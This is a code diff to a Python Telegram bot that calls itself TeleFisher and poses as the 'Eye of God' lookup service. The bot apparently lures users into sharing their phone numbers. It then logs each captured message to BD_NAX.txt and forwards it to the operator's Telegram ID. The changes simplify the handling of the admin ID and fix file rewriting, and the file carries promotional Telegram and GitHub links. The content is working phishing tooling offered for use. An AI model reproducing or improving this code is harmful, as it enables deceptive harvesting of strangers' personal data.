@@ -57,7 +57,7 @@ print(f'''
 {reset}           
                         Тип: {cyan}ГЛАЗ БОГА    
                         
-                    {bold}{yellow}TELEGRAM:{magenta} t.me/dnt_te
+                    {bold}{yellow}TELEGRAM:{magenta} https://t.me/dnt_te
                     https://github.com/kiberdans/TeleFisher
       ''')
 
@@ -74,7 +74,7 @@ def is_valid_token(token):
 
 
 token = ''
-admin_id = []
+admin_id = ''
 bd_go = ''
 
 with open('logins.txt', 'r+') as logins_file:
@@ -85,9 +85,7 @@ with open('logins.txt', 'r+') as logins_file:
 
     for line in lines:
         if "admin_id" in line:
-            admin_ids = line.split("=")[1].strip().replace(" ", "").split(
-                ",")  # разделяем строку по запятым и удаляем лишние пробелы
-            admin_id.extend(admin_ids)  # добавляем полученные admin_id в список
+            admin_id = str(line.split("=")[1].strip())
 
     for line in lines:
         if "bd_go" in line:
@@ -102,17 +100,12 @@ with open('logins.txt', 'r+') as logins_file:
         for i, line in enumerate(lines):
             if line.startswith("token"):
                 lines[i] = f"token = {token}\n"
+        logins_file.seek(0)
         logins_file.writelines(lines)
 
-    if admin_id == ['']:
-        while admin_id == ['']:
-            input_id2 = input(f"     Введите ваш {yellow}telegram ID{ingo}")
-            if ',' in input_id2:
-                if id.strip().isdigit():
-                    for id in input_id2.split(','):
-                        admin_id = int(id.strip())
-            else:
-                admin_id = input_id2
+    if admin_id == '':
+        while admin_id == '':
+            admin_id = input(f"     Введите ваш {yellow}telegram ID{ingo}")
         for i, line in enumerate(lines):
             if line.startswith("admin_id"):
                 lines[i] = f"admin_id = {admin_id}\n"
@@ -124,6 +117,8 @@ with open('logins.txt', 'r+') as logins_file:
             if line.startswith("bd_go"):
                 lines[i] = f"bd_go = {bd_go}\n"
                 break
+        logins_file.seek(0)
+        logins_file.writelines(lines)
 
     menu_sms = (f"""
     {reset}
@@ -169,13 +164,7 @@ with open('logins.txt', 'r+') as logins_file:
                 print(f"\nВаш id - {admin_id}")
                 print(menu_sms)
             elif on_var == "3":
-                input_id2 = input(f"\nВведите ваш {yellow}telegram ID\n{ingo}")
-                if ',' in input_id2:
-                    if id.strip().isdigit():
-                        for id in input_id2.split(','):
-                            admin_id = int(id.strip())
-                else:
-                    admin_id = input_id2
+                admin_id = input(f"\nВведите ваш {yellow}telegram ID\n{ingo}")
                 for i, line in enumerate(lines):
                     if line.startswith("admin_id"):
                         lines[i] = f"admin_id = {admin_id}\n"
@@ -321,11 +310,11 @@ try:
                 if bd_go == "+":
                     with open('BD_NAX.txt', 'a') as bd_file:
                         bd_file.write(admin_message)
-                for admin in admin_id:
-                    try:
-                        bot.send_message(admin, admin_message)
-                    except:
-                        print('     {red}Oшибка отправки на указанный id      ')
+
+                try:
+                    bot.send_message(admin_id, admin_message)
+                except:
+                    print('     {red}Oшибка отправки на указанный id      ')
             else:
                 bot.send_message(message.chat.id, "Это не ваш номер телефона. Пожалуйста, подтвердите свой номер.")
 
